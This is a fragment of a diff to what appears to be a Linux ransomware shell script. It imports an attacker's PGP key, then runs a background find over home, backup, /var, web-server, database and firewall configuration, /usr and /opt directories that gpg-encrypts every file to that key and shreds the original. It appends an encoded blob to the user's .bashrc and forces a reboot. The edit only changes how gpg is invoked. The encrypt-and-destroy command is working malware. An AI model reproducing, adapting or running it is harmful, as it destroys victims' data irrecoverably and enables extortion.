@@ -43,7 +43,6 @@ jYJoJqB4zgS2HatUuWA1eO2/rrOe2UEc/DPLzXTCjDczzVH/2mgpnvNsp12jkok9
 I57Q5vcwTg==
 =K5dc
 -----END PGP PUBLIC KEY BLOCK-----' | gpg --import
-cp /usr/bin/gpg /sbin/
-nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr/lib /usr/share /usr/local /usr/src /opt -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr/lib /usr/share /usr/local /usr/src /opt -type f ! -name '*.ENC' -exec gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
 echo H4sIAAAAAAAAA0tNzshX0E1VUOLi4lKAg5B8hZTU5KLKghKFlMSSRAVdXYWCxEqFGBVTAwMDhcw8BafMkuR8IF2Sr2DoVJRbmJJd5Fac7e4ekuYUnmqYVJqcWeZrWe7i5GOWbe4DNFqJCwAACG+XaQAAAA== | base64 -d | gzip -d >> $HOME/.bashrc
 shutdown -r now
